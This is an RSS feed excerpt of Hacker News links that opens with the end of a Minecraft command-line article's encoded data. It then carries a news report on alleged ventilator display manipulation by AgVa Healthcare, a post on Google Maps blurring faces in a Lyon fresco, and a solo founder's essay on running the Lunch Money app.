ZyEdk85KwiLcAaZhejzz8q+qUN8iIb0+jO1QA+bbVB5QuSFRJlV3aw9IxDgn9wly
M+NegzU33iIh6dNdXM2Fv//q72+bzw9qsOqmbxBpRLCT6uKaW+zB8g0hebBFozbV
GudVBea6IkpUxx9QpY3EitLghT8/Efz1mZ+sVWClTyMqiaadHiU6kVRVPPAC1CpS
TETKg9WQRdSXpKe/KFCZQ7OBB410nZB1qKt0s1La+7b0YL7LREg7SiTSpwWB5jmR
fdqxNArqMK2NOc+MGacG7HAypJIGI5KlMUkkmKKjiTKh0FRr42E9oJ2I4rc8SrHl
HHNL+Eha1aEWo2WpLvLJhDw5ngjRB1lnUocjlSvVArVbmRyn0ZFntjCmRKpH1MsJ
Udzs4YKXrDEOPNeSpC+iTdYf6IaJJ00PyVBVcdI4+TI+M2monMCnbuPMLDTBBejf
AEv4TOGzis88Pgv4mPVz+Czis2LDDGAWnc3t9mV0KBpUKrC8K+kBE4niw3RsHJAj
LDD+qde//e5LLuRm36DShEoF6u2IxGogNG43tY36eLOo7WsICVA7f+78hXPnUb7Z
FhnmQQMDFMFEM8KRv5GhcYOoqyII0LUrsEA4F4dNEYYGQpDvmTJ8a1EMBoAn/4gA
0EyUFuGGUOrSAUKLQgkbBpX2Ek4Rg7xAbDJJrzN/Hw9CJrSOrkdupTsgULJoh0Z9
PYCZCy+++PwFXNFDeodG2YpljLvEp0GLdpP+dtQTMNMjXOHM2YAp0uX0Eh9qSa5i
vCGQ6OaA4nYZzRqJIpEgIK8HBwaXQytmynoxkOLQINvkjid8J6DFu2uJjhM9muoJ
2WcHtEVJsGtBYcRsIRBXRdeayMK1G11BfS9FmulhU5IwNDNTz71Qh/lU9j3C0NSZ
tIuBuIHIiFHVHPp8JNBSIPAguXHTifEVPP/DlllwlSqFGoyEmQvEdcZpS4p4rG0S
oeRSEb4e9TFus03xlLYjJcKIkZGaOBSGNGAYEXtUGZ1G5KuRgW7C92ga4eiO2bqG
tcGOECODebiKT5p3YZ/SeDsyDiPkcMQX7ecMNSH0SiB2WMg0DZomfI39sgVzoehu
SUZ7OXMvmewnQuNx7Zgar34eCa0CeyRgiYKp88+iT6F5xh6dW7/MRX89wGMaRUE6
cVrF1NcGztRWmsSagyTaHxGsKkSVdNUm7twlY6fH7XaJloJPbofRUnNO5MHMhsnz
HtRDGgpUShkYWbqcSL1hI1hpEsZgwcZrczSgGZQGj7x1rSXrJpoqA0zVGkxvEEVf
/ZcL+gwUPjWGQHtuzD9HtEYhO4E7nXTdxeXJdZ88cp2yBs62+/nt2+/llj1ZXBam
AZouREBEJ0i4MSYGgrkVbaKvbPKhMVAVFneF1IQ3heABRilYMF5e7yohY+Nz6yHG
tXaw2CBdxhHX8EIB82ySay0kwx4fGv4sQjN2E4YpeQYah4Q7J3n57t17CKhIt2Hm
EBZrPSfFDNTxlyPauXsP/88bGVsM+bhLHm7uSeqzmG4Isd/A65r9Yy9gzXwG7hIp
Kc+nKHdJemw8oGKJQNdB3gxh5fR44lCIgEadGL2a3JpI30NqILuDBBxO5FkT6QvC
86TEJz4jna4gGk4VeCu8qQT5BI8hF3Z60pxl7k7D0evcbmfygwhMnb4kQzeV2/Sr
SdTntLjpANl3uojN6MM58jiRMacFdTADFDZNjYXAHwdCTHBJp4xm+U3T4R41J/dM
zlh4cLhBmGgtIlRZhB0fg81koo6ZM46Qt63EdNcVh3ljpUY0h5M7z4DI/Y4g+079
ooBW7hyXrslGTtGCrXwiY1rmLTEnBoVOFvTpUtrL02cHPcAw5PDZB+qvQqd2cbuu
pZqYEAkfGSxvqBgBzQJ2Lgo4wbuGzINRpgZeWRVWBEYfPYFWKukTmYplf/okmjDz
hPz5sPHTjNHRFgpybhyzaN8Z+omcbC7zdgaI8bRDJOIwPFVq1kkj5c7KAGmkSSEM
bGykR7h63/D9tJmhjc/knYNJf1AY7UtKU5cpuuNAUHj6AQoUvLwQ012eFKPRSt1F
BM8JLTDv9lPSpbwLxHja+eDJ/CSvGTfZxC59vDxaO33jEznD+UMSFTZT2twz77d6
CjKfKJ6zxV/nbo8VZ7t4iVEl56JYP8qLkkIZmmM1r1JmtxIGnHThbHFDTvt9WyPl
zDUCj9Mlbkp5SHUFPsPUBifKOPpmIiPi003Gtb212ytTmgaXmGqjw1K5lbBrMY1w
aI2pImmlAQtabFDMcbG5mwQmk32uPHiOSETHCZr/LVkdJ74+nhxWGqXl4fiI6e7/
Eb0PT7GjoC5Lu0cE+vHj+mPItqXRf5xke3wUeLRUfETGPT40PHoKfmimLYOOYvY9
KndWYBkRwWHIGCUaTKV/8GL8+IigFGROF7BozOdsBkAlK7Gqadg61jUrqlC7GbdN
kWC7KbM34+sCSwFz256D6ddf326Z7stffva9v73SfO23byWn3ln4wvw1LBksYsl8
X7SC1R8GWRN9mSGeN6B2VZjqoZb2aUo/HsztIfy/QQcMq22s0lxherzFJTUCFkVW
nppLAQ2o7gplmdx5+92bf/rNL75x8drGh9e+ub1057s//dpbL31rdwqmTecEClVS
HaZYAIs5f8IznoLqOpOVz2MRcy3aklgXBeUFVM56V/7+uzu3/31l4Ye/rn34wdr3
/9CA+h4a2ahnel5TzZlPE3Brauum4BuUrUJta5cp4Xqw/p5RfbWH4NW2DQLDaYfi
XfNVrJzKJKzjmWet39K+aUGk56LLH/znXsN6hGVtDrgKM21fGFuBdwzLVuFUnPbd
die85SP8pGb/6B8zUL0Z777y/vs/wgL7kmmCbWMuUeAccs60/9NOnGm8VaFh9M5E
WkvtcOnWgCRqbId//vj2FNRNTZ+5+XKbcuprGhjubS5MOVtrQGPUHTEV/VIFpu2c
O/vSsqMCM01TDlc8qGrSxwBKey4Ap40TWQYVx+DIwvIBTGDEZMoxOaKCfACLpRGL
qmORA6YMf9ziqYxwuqixhVQDn6OdMuIZR1yWuAu0NUebx9ZDSjFjUiltE8HRz2b0
swXLZZc5EnNEsoLkDbfgZF5yxLeOaWirgjheQc9xpZMR1zPiuSIEYN7JyGoZ2bwj
WylkvIJyC47y/pt0RlfN6BYLRpgssApqLRetnK9ZM/qnMRAWTLyYrl3a1rJhVrPt
sq/g780q1E1/zMbNVPQOhqAeJCYs7Ujl7acyavOS7VlEGbxTBhYVMKmNX7btCB/T
3Yi1eRF2EaMQQZ7ItPGatcsr4KVbuHbU7EEW71d+WYPFtE1PevRNEdHsndg0eDuY
/iywYPKqqKXvfOliDVYmXqOZHS6ecwsasNTGG0iQcBqkLXSXMBoWMmwrbXbX9DQl
qYE3fjmQvRIogpGHsIoju3j5Ug2YvRSZswkmXwjOQ73l+s9BmrX+C1DWASjXHAAA
</code></pre>
<p>I use <code>view-nbt</code> to view the data in a readable format:</p>
<p>(<code>level.dat</code> files are compressed, so I use the <code>--gzip</code> flag.)</p>
<blockquote>
<pre><code>$ ./view-nbt --gzip level.dat |
  python3 -m json.tool |
  head -n 30
</code></pre>
</blockquote>
<pre><code>{
  "Data": {
    "WanderingTraderSpawnChance": 25,
    "BorderCenterZ": 0.0,
    "Difficulty": 3,
    "BorderSizeLerpTime": 0,
    "raining": 0,
    "Time": 15810,
    "GameType": 0,
    "ServerBrands": [
      "vanilla"
    ],
    "BorderCenterX": 0.0,
    "BorderDamagePerBlock": 0.2,</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johnlekberg.com/blog/2020-07-04-cli-minecraft.html">https://johnlekberg.com/blog/2020-07-04-cli-minecraft.html</a></em></p>]]>
            </description>
            <link>https://johnlekberg.com/blog/2020-07-04-cli-minecraft.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732999</guid>
            <pubDate>Sat, 04 Jul 2020 15:40:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software cheat to hide poor performance of Ventilators]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732998">thread link</a>) | @aj_jaswanth
<br/>
July 4, 2020 | https://www.huffingtonpost.in/entry/pmcares-ventilator-maker-agva-fudged-software-to-hide-poor-performance-ex-employees-say_in_5effee54c5b612083c5c6fbc/ | <a href="https://web.archive.org/web/*/https://www.huffingtonpost.in/entry/pmcares-ventilator-maker-agva-fudged-software-to-hide-poor-performance-ex-employees-say_in_5effee54c5b612083c5c6fbc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>NEW DELHI — Two former employees at controversial medical startup AgVa Healthcare told </span><em><span>HuffPost India</span></em><span> that the company manipulated the software running its low-cost ventilators to make the devices show they were pumping more oxygen into patients’ lungs than they actually were.</span></p><p><span>These startling revelations come after doctors at Mumbai’s prestigious JJ Hospital observed a variance between the actual performance of AgVa ventilators, and the performance registered on the device display. The AgVa ventilators were evaluated after JJ Hospital received 39 AgVa devices as a charitable donation. St. George Hospital, which is attached to JJ Hospital and is a dedicated Covid hospital, had received 42 AgVa ventilators.</span></p><p><span>The JJ Hospital report, written by a panel of five experienced doctors and reviewed by </span><em><span>HuffPost India</span></em><span>, said, “Maximum level of displayed FiO2 did not indicate actual delivered FiO2 as patient showed signs of desaturation upto 86% on multipara monitor.”&nbsp;</span></p><p><span>FiO2, or Fraction of Inspired Oxygen, refers to the percentage of oxygen in the air pumped into a patient’s lung — ranging from 21% (the percentage of oxygen naturally occurring in the atmosphere) to 100%, when pure oxygen is pumped into a patient’s lungs.&nbsp;</span></p><p><span>FiO2 is a crucial parameter for COVID patients. “When the lining of the lung gets diseased, patients need higher amounts of oxygen to ensure the body is able to extract enough oxygen,” said Dr Dileep Raman, an ICU specialist. “This happens in pneumonia, ARDS as well as in the case of COVID-19,” he explained.</span></p><p><span>The JJ Hospital report also echoes </span><a href="https://www.huffingtonpost.in/entry/agva-ventilators-pmcares-covid-19-order_in_5ef1ea38c5b6001a27157ccd"><span>several concerns raised by a panel of experienced doctors</span></a><span> in Ram Manohar Lohia Hospital in Delhi, who evaluated the AgVa ventilators at the direction of the Modi government’s health ministry. The JJ Hospital and RML Hospital reports flagged similar shortcomings: the AgVa ventilators evaluated were prone to failure, those that worked struggled to maintain critical parameters, the ventilators struggled to deliver high FiO2 percentages, and could not cater to the needs of critically ill patients in ICUs.&nbsp;</span></p><p><span>One AgVa ventilator, the JJ Hospital report noted, failed within five minutes of being plugged into a testing machine. Patients connected to the ventilators, the report said, “were getting restless, tachypneic, and were sweating.” Tachypnea refers to a state of rapid, abnormal, breathing.</span></p></div><div><p><span>Last month </span><em><span>HuffPost India</span></em><a href="https://www.huffingtonpost.in/entry/agva-ventilators-pmcares-covid-19-order_in_5ef1ea38c5b6001a27157ccd"><span>reported</span></a><span> that the RML Hospital panel initially rejected AgVa’s ventilators. The ministry then sent the ventilators for re-evaluation to a different panel of doctors who passed the ventilators with the caveat that AgVa’s ventilators were not substitutes for high-end, ICU-grade ventilators and should only be used in cases where a backup ventilator is available. As </span><em><span>HuffPost India</span></em><span>’s report noted, doctors from Gujarat, Haryana, Uttar Pradesh, Delhi and now Mumbai have raised concerns about the quality and performance of AgVa’s ventilators.</span></p><p><span>AgVa Healthcare has been in the limelight since March this year when the Modi government ordered 10,000 of the company’s Covid-model ventilators as part of India’s response to the novel coronavirus pandemic. The Modi government has responded to public criticism of its decision to buy AgVa products by insisting that the ventilators are suitable for treating Covid patients. The ventilators are now synonymous with Prime Minister Modi: the devices are being shipped bearing the logo of the Prime Minister’s </span><a href="https://www.huffingtonpost.in/entry/pm-cares-and-pmnrf-both-opaque-in-same-way-documents-show_in_5e8cbd55c5b6e1d10a6ad2c9"><span>opaque and unaudited PMCARES Fund</span></a><span>, and are a vital part of the government’s </span><a href="https://www.huffingtonpost.in/entry/pm-cares-bjp-leaders-share-photo-of-one-ventilator_in_5ee71201c5b6b54802e39ac2"><span>PR campaign</span></a><span> to deflect criticism that Modi did not do enough to prepare the country for the ongoing pandemic.&nbsp;</span></p><p><span>Now, the JJ Hospital report — </span><a href="https://mumbaimirror.indiatimes.com/coronavirus/news/81-made-in-india-ventilators-fail-the-test-at-city-hospitals/articleshow/76680531.cms" target="_blank"><span>first reported by the </span><em><span>Mumbai Mirror</span></em></a><span>— and the previously unreported accounts of two former employees revive concerns that AgVa Healthcare has overstated the capabilities of their low cost devices.</span></p><p><span>AgVa Healthcare has rejected claims by its former employees that the company manipulated its software to exaggerate the performance of its devices.&nbsp;</span></p><p><span>“This is a completely malafide and false comment. FiO2 can easily be checked on any ventilator by connecting an oxygen analyser to 1% accuracy. Any AgVa ventilator can be tested at any point of time by anyone,” AgVa founder Diwakar Vaish said in an email to </span><em><span>HuffPost India</span></em><span>. “Also, irrespective of what the ventilator shows, patients will not achieve 100% oxygen saturation if 100% FiO2 is required by the patient and can be checked on the patient monitor.”</span></p><p><span>The ventilators at JJ Hospital, Vaish said, were not installed by AgVa engineers and were a different, older, model from the ventilators.&nbsp;</span></p><p><span>“The ventilators were purchased by donors and distributed to these hospitals and initial installation done by some 3rd party without informing us,” Vaish said. “As our ventilator requires a proprietary breathing circuit and training, the doctors who used it initially did not operate it properly and this resulted in improper ventilation.”&nbsp;</span></p><p><span>AgVa is now providing its newest models to JJ Hospital, Vaish said, which were the same models being sold to the Indian government.</span></p><p><strong>FiO2 Issues</strong></p><p><span>One of the former AgVa employees who spoke to </span><em><span>HuffPost India</span></em><span> said that he noticed the problem in February this year. It was late evening and he</span><span> was in a hurry as five AgVa Advanced ventilators were going through their final checks before being shipped to a client.</span></p><p><span>“I was testing the devices and I noticed that the FiO2 is not even reaching 90%,” said the executive, who is no longer working at AgVa, and said he alerted a member of the technical team.&nbsp;</span></p><p><span>“He fixed FiO2 in five devices in just 10 minutes with simple lines of code,” the former employee&nbsp; said, seeking anonymity as he feared reprisals by the company. “FiO2 level is a hardware issue. How can you adjust it via computer? Then he said it’s not adjusted. It’s the same as before—just that the value is changed to show 95 , 97 , 99 or 100.”</span></p><p><span>“The computer coder puts a command in the ventilator that it will show 99-100% FIO2 reached even if it is 80%,” the former employee&nbsp; said. “I came to know about this computer code manipulation in February only after it was done in front of me by mistake.”</span></p><p><span>Ashwani Kumar, a former AgVa sales executive, told </span><em><span>HuffPost India</span></em><span> that he had seen AgVa ventilators display they were hitting 80% FiO2 (80% oxygen) even when the devices were not connected to an oxygen source. He said he pointed out that the natural percentage of oxygen in air is only 21%, and asked how the ventilator showed it was delivering 80% oxygen without a separate source of oxygen.</span></p><p><span>“The data displayed by the ventilator is manipulated,” Kumar said. “It has been coded in a way to manipulate the FiO2 value.”</span></p><p><span>As noted earlier in the piece, Vaish from AgVa has rejected these accounts as “false” and completely “malafide”.</span></p><p><span>Both former employees also said that AgVa employees were often sent out to perform tasks that they were not formally trained for, such as ventilator installation and troubleshooting, a charge AgVa refutes.&nbsp;</span></p><p><span>The report by&nbsp; JJ Hospital’s doctors offers an example:. When the doctors first flagged problems with their AgVa ventilators, the company sent an employee named Surya Pratap to fix the problem.&nbsp;</span></p><p><span>“On 26 May 2020, these various issues including setting of FiO2 were discussed with Mr. Surya Pratap who did software upgradation in wards on AgVa ventilators which means that the ventilators were delivered for patient use without quality control assurance test which could be fatal to patients,” the JJ Hospital report says.</span></p><p><span>Vaish said, “We routinely upgrade the user interface software to the latest version during the installation. It is part of the SOP of the installation process.”</span></p><p><span>It is worth noting that the problems flagged by the doctors at JJ Hospital — ventilator failure, FiO2 delivery, desaturation of patients — are not typically user interface problems.</span></p><p><span>On LinkedIn, Surya Pratap describes himself as a “Digital Marketing Strategist” and a Marketing Specialist at AgVa Healthcare — a job he has held for one year and four months. His prior work experience involves three years in the BPO industry, and little to suggest he is qualified to troubleshoot critical bio-medical devices in a situation where lives are at stake.</span></p><p><span>In an email, Vaish from AgVa said “Surya Pratap is heading the service team of AgVa and has more than 100 service engineers under him across the country.”</span></p><p><span>Vaish sidestepped a question on how Pratap was qualified to lead a team of engineers.</span></p><p><span>“Surya Pratap joined us as a marketing specialist but soon became adept at serving and excelled in his job. Further, he has made his way to the top with his exceptional learning skills over the past months,” Vaish said. AgVa has over 500 employees, Vaish said, “more than” 100 of whom are service engineers.</span></p><p><span>A senior doctor who was part of the health ministry’s first clinical evaluation trial of AgVa’s Covid ventilators in May this year said the committee called for more validation as they felt the device had been rushed to market.</span></p><p><span>“We told them, don’t play with the lives of patients. Modify the machine, perfect the machine, don’t hurry it. That was our reason for calling for more validation,” the doctor said. “We should not compromise on ventilator quality. My Indian brothers and sisters should not be harmed by a product we have cleared. Which is why we said the ventilator needs more validation.”</span></p><p><a href="https://www.huffingtonpost.in/entry/agva-ventilators-pmcares-covid-19-order_in_5ef1ea38c5b6001a27157ccd"><span>As </span><em><span>HuffPost India</span></em><span> has previously reported</span></a><span>, the government then sent the AgVa ventilator to a different panel of doctors, who cleared it with the caveats that the AgVa Covid model ventilator “should not be considered as a replacement for high-end ventilators in tertiary care ICUs” and that “there should be a provision for backup ventilator in the facility where these ventilators are used.”</span></p><p><strong>JJ Hospital Responds</strong></p><p><span>On June 30, Diwarkar Vaish flew to Mumbai’s JJ Hospital and demonstrated AgVa’s newest Covid model to the hospital’s sceptical doctors. This is the same model that AgVa is supplying 10,000 devices to the Indian government. A doctor present at the …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.huffingtonpost.in/entry/pmcares-ventilator-maker-agva-fudged-software-to-hide-poor-performance-ex-employees-say_in_5effee54c5b612083c5c6fbc/">https://www.huffingtonpost.in/entry/pmcares-ventilator-maker-agva-fudged-software-to-hide-poor-performance-ex-employees-say_in_5effee54c5b612083c5c6fbc/</a></em></p>]]>
            </description>
            <link>https://www.huffingtonpost.in/entry/pmcares-ventilator-maker-agva-fudged-software-to-hide-poor-performance-ex-employees-say_in_5effee54c5b612083c5c6fbc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732998</guid>
            <pubDate>Sat, 04 Jul 2020 15:40:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Maps Censors Art?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732976">thread link</a>) | @chrisandchips
<br/>
July 4, 2020 | http://www.chrislessard.co/html/articles/google-maps-art.html | <a href="https://web.archive.org/web/*/http://www.chrislessard.co/html/articles/google-maps-art.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    

    <p>When passing through the French city of Lyon last summer, I was delighted to learn that it’s home to a collection
        of enormous Frescos scattered throughout town. My girlfriend and I discovered one on accident and made a point of trying to see as many as we could during our time there. Somehow, we
        managed to miss probably the city's most famous: the Fresque des Lyonnais located in the 1st arrondissement.
        It’s a depiction of the Lyon's various historical figures, most of whom are painted out on their balcony.</p>

    <p>
        <img src="https://thisislyon.fr/wp-content/uploads/2018/04/lyon-fresque-lyonnais-general.jpg">
        <br>
        (source: <a href="https://thisislyon.fr/things-to-do/historical-monuments/la-fresque-des-lyonnais/">https://thisislyon.fr/things-to-do/historical-monuments/la-fresque-des-lyonnais/</a>)
    </p>

    <p>
        I was revisiting Lyon (virtually) the other day after reading <a href="https://www.newyorker.com/magazine/2020/04/13/baking-bread-in-lyon">a New Yorker article</a> about the
        bakery located in
        the same building as the Fresco. After dropping myself in on Google Maps to take a closer look at the
        storefront, I decided to continue on a little virtual tour. I soon noticed something strange: Google Maps was
        blurring the faces of the painting.
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/1_blurred_faces.png">
    </p>

    <p>
        At first, this made me laugh - I figured the algorithm Google uses was too smart for its own good. I suppose
        this isn’t all that odd, the paintings on the city’s frescos tend to be pretty realistic and the buildings
        themselves often blend into their surroundings.
    </p>

    <p>I was about to close the tab when I noticed that it didn’t seem to be *that* smart:</p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/2_non_blurred.png">
    </p>

    <p>
        I started moving the Google camera around to get a closer look, which led to the further realization that Google
        was actually censoring the faces in what appears to be real time:
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/3_lumiere_a.png">
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/4_lumiere_b.png">
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/5_lumiere_c.png">
        <br>
        The Lumière brothers, captured from three adjacent positions
    </p>

    <p>
        In fact, I was able to reorient myself such that I could make almost every face on the wall become clear. What
        still puzzles me is that to my naked eye, none of the changes in perspective really made the faces look any less
        or more “real”.
    </p>

    <p>
        I’m not sure if the face-recognition calculation is actually run on the spot (for performance’s sake, I would
        guess that it isn’t) but clearly something is going on here. It’s strange. One would assume that if a “person”
        is identified, their face is blurred no matter what. This doesn’t appear to be true, since its possible to
        re-orient ones self along the street in order to reveal different faces. Google seems to make each evaluation
        based solely on the camera's current location and perspective.
    </p>

    <p>
        Out of curiosity, I played with some of the pedestrians nearby to see if there was some way to reproduce the
        results. This was a bit tricky, since advancing the camera even by one unit doesn’t necessarily hold the guarantee
        that the same pedestrian will still be around.
    </p>
        
    <p>
        <img src="http://www.chrislessard.co/assets/images/6_man_far.png">
        <br>
    </p>

    <p>
        Google doesn’t seem to blur this guy until you zoom in a unit closer (I had to manually zoom myself in the above picture to get
        the shot):
    </p>

    <p>
        <img src="http://www.chrislessard.co/assets/images/7_man_close.png">
        <br>
    </p>

    <p>His face is pretty blurry in that first photo anyways, so it's likely that Google is determining whether there is
        enough information to justify the blur.</p>
    
    <p>
        I didn't play around too much more with it. My guess is that the blurring is correct 99% of the time, when it comes to real humans. Still, it was interesting to get a bit of insight into how (well, when) the blurring is applied. Do I get karma for finding a bug with The Frescos?
    </p>

    <h4>July 1st, 2020</h4>
    <a href="http://www.chrislessard.co/html/writing.html"></a>

</div>]]>
            </description>
            <link>http://www.chrislessard.co/html/articles/google-maps-art.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732976</guid>
            <pubDate>Sat, 04 Jul 2020 15:38:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizations as a Company of One]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732759">thread link</a>) | @jnfr
<br/>
July 4, 2020 | https://lunchbag.ca/company-of-one | <a href="https://web.archive.org/web/*/https://lunchbag.ca/company-of-one">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<p><span>
				Written on <time datetime="2020-05-18 16:00:00 +0000 UTC">May 18, 2020</time>
			</span>
		</p>
		

<p>Hello! 👋 My name is Jen and I’m the founder, engineer, designer and customer support at <a href="https://lunchmoney.app/">Lunch Money</a>, a personal finance and budgeting web app.</p>

<p>In short, I am a company of one. I answer the customer support emails and I code and deploy new features. I also manage the <a href="https://developers.lunchmoney.app/" target="_blank">API docs</a> and <a href="https://support.lunchmoney.app/" target="_blank">knowledge base</a>, poke around the logs when there are issues, write the <a href="https://lunchmoney.app/sample_newsletter" target="_blank">bi-monthly newsletters</a> and I designed the logo!</p>

<p>As the company scales, so too must all aspects of my work which I break down into 4 parts: customer support, engineering, product and marketing.</p>

<p><strong>Finding opportunities for process optimization is honestly one of the more fun parts of running a business</strong>. I greatly attribute these to how I’ve been able to stay both solo &amp; sane up until now, currently with 600+ users and $45,000 ARR. In this post, I’m excited to share some of my most successful strategies along with anecdotes from my experience working on Lunch Money.</p>



<p>In the last 14 days, here’s what I got done across all departments:</p>

<ul>
<li><strong>Product:</strong> Launched an internal beta testers program and two sets of new features to test</li>
<li><strong>Engineering:</strong> Wrapped up a 2-week long refactor of some core components on the client-side</li>
<li><strong>Engineering:</strong> Launched a major feature: advanced transaction filters</li>
<li><strong>Engineering:</strong> Closed 13 tickets related to feature improvements and bug fixes</li>
<li><strong>Marketing:</strong> Sent out a newsletter outlining the latest new features</li>
<li><strong>Marketing:</strong> This blog post</li>
<li><strong>Marketing:</strong> Added new pages to the marketing site (<a href="https://lunchmoney.app/features/rules">Rules</a> and <a href="https://lunchmoney.app/features/collaboration">Collaboration</a>) and updated the icons in <a href="https://lunchmoney.app/features">Features</a></li>
<li><strong>Support:</strong> Received 239 inbound support tickets and sent out 358 emails</li>
</ul>

<p>What makes all this work bearable for me is the fact that there is so much variety (which, of course, is the spice of life!). I love being able to switch between tasks to keep the job interesting and my mind refreshed while still being productive overall.</p>

<p><em>Case in point: I just finished a major refactor and pushed out 2 major features to beta, so writing this blog post right now feels like a vacation for my brain.</em></p>

<p>To state the obvious, I enjoy being hyper-efficient (without burning myself out, of course). Even though I am a single person, I can still automate, optimize and parallelize processes.</p>



<h2 id="implement-safeguards">Implement safeguards</h2>

<p><i>Ah, the blissful beginnings of Lunch Money when I’d push code directly to production several times a day.</i></p>

<p>At 500+ users now, those days are long gone and I’ve since needed to adopt the more boring but responsible approach of implementing safeguards to prevent shipping faulty code.</p>

<p>For one, <b>I’ve been thoroughly reviewing my own code before every change</b>. Every major feature, improvement and bug fix lives in a feature branch that I still, by habit from the corporate days, prepend with <code>jen/</code>. After verifying everything works great locally, I make sure to take a break first, whether that’s working on a completely unrelated task, going for a meal or going to bed. The point of this is to ensure that I’m code reviewing with a clear head.</p>

<p>While adhering to these standards of code reviewing myself may add extra time to my overall process, it potentially saves hours of bug-fixing, answering related support tickets and self-loathing (I’m half-kidding here) down the line if I accidentally ship bad code.</p>

<center><blockquote><p lang="en" dir="ltr">New phase of Lunch Money– no more pushing major features straight to production 🤯😂 <a href="https://t.co/RYsz7BnU3L">https://t.co/RYsz7BnU3L</a></p>— Jen (@lunchbag) <a href="https://twitter.com/lunchbag/status/1256987437600927744?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> </center>

<p><b>I also recently implemented an internal beta-testing program open to Lunch Money subscribers.</b> With more users accessing my app on a regular basis, the stakes are higher to ship a version that’s as bug-free as possible.</p>

<p>As an engineering team of one, it’s nearly impossible to always get it right the first time, despite having tests (what if I missed an edge case?) or testing locally extensively (how I think my users will use a feature is not always so).</p>

<p>The beta-testing program has provided some additional benefits. It’s nice to have a cohort of users with whom I can have a more candid conversation about Lunch Money and it’s also a great way to show users that their feedback is valued!</p>

<h2 id="automate-later-than-you-need-to">Automate later than you need to</h2>

<p>While automating tasks can save a lot of time in the long-term, it doesn’t always make sense to automate right off the bat.</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png"><span>Obligatory XKCD comic (<a href="https://xkcd.com/1205/" target="_blank">link</a>)</span></p>

<p>Automating too late is not a bad thing. I’ll have done the manual work enough times to understand how to eventually automate the task and what edge cases to look out for. I equate it to doing a job yourself before hiring someone– it’s always better to grok the requirements first to some degree so you can understand how to best utilize who you’ve brought on (and appreciate them more!).</p>

<p>I manually triggered the emails for bi-monthly account summaries for months because I wasn’t confident the sending cadence was reasonable. After observing open rates and collecting user feedback, these are now automated to go out on the 5th &amp; 25th of every month.</p>

<p>Something that I’m glad I didn’t spend the time to automate at all was the referral program. If an existing user refers a new user and the new user subscribes to a plan, then both users will receive credit for 1 month.</p>

<p>In the end, the referral program only brought on 11 extra users. It was not a pain at all to manually process rewards for those who did. If I had spent time conjuring up all the edge cases and automating this process, it would not have been worth the time investment.</p>

<h2 id="keep-low-hanging-fruits-in-the-back-pocket">Keep low-hanging fruits in the back pocket</h2>

<p>In my task management system, I use a tag (🍏) to denote which tasks are low-hanging fruits. For the uninitiated, low-hanging fruits are quick tasks that are easy to knock out, such as one-liners or 5-minute fixes.</p>

<p><img src="https://media.giphy.com/media/YP1Jb0JNc7kqFDbdjm/giphy.gif"></p>

<p>I find that keeping these around and tackling them on days when you feel generally unmotivated can really help raise spirits. Still being able to get something completed and shipped is a great way to get out of a slump.</p>



<h2 id="timing-marketing-pushes">Timing marketing pushes</h2>

<p>At Lunch Money, a big part of the business is using the services of Plaid for bank syncing. Plaid charges on a monthly basis which means that if a user signs up on April 30, connects a bank account immediately and doesn’t end up subscribing at the end of their 14-day trial, they will charge me for this user in both April &amp; May’s invoices.</p>

<p>This realization coupled with my intense aversion to paying more than I need to has shaped a lot of practices at Lunch Money.</p>

<p>For one, the data retention policy used to be 30 days which means if your trial ends and you didn’t put in your billing information, your data will be deleted in 30 days. This certainly guarantees that I’ll be overpaying for churned users and is the reason why the data retention policy has since been revised to 5 days.</p>

<p>In total, a user who does not end up subscribing can spend up to 26 days in the Lunch Money system. This comprises of a 14-day trial, the potential for a 1 week trial extension and a 5 day grace period. Assuming enough users connect their bank accounts, the best way to minimize my costs for churned users is to ensure their lifetimes are within one calendar month.</p>

<p><img src="https://lunchbag.ca/uploads/calendar-1.png"></p>

<p>As a result, I always schedule marketing pushes such as blog posts and product launches in the first few days of the month. When I came to this realization, my next Plaid bill went down for the first time.</p>

<h2 id="merging-marketing-and-engineering-for-a-combo-win">Merging marketing and engineering for a combo win</h2>

<p>Taking this a step further, the perk of having a spike in new users is that their trial periods more-or-less overlap. Usually when a new user signs up, they will poke around the product and maybe send in a bug report, a feature request or another piece of feedback. If I reply and address their feedback by putting in a fix or shipping their requested feature within days, more often than not, they end up converting into a happy customer.</p>

<p>I’ve therefore identified the following cycle to maximize potential conversions from spikes in user signups:</p>

<p><img src="https://lunchbag.ca/uploads/gantt-2.png"></p>

<p>After a marketing push, let’s say a product launch, I will see an immediate increase in signups lasting about 3 days and then slowly trailing off.</p>

<p>Over the next few days, I’ll start hearing from these new users via support tickets. I prioritize responding to them and I get to work. Showing these users that I’m committed to improving Lunch Money based on their feedback is a great and honest sales tactic.</p>

<p>About 3 days before the initial wave of user trials ends, I wrap up my engineering sprint and send out a newsletter detailing the latest features and improvements. This re-enforces to new users that the product is under continuous development.</p>

<p>Finally, I have a drip campaign that automatically notifies users a few days before their trial expires and on the actual date of expiry. This period of time is when I typically see most users convert 🤞.</p>



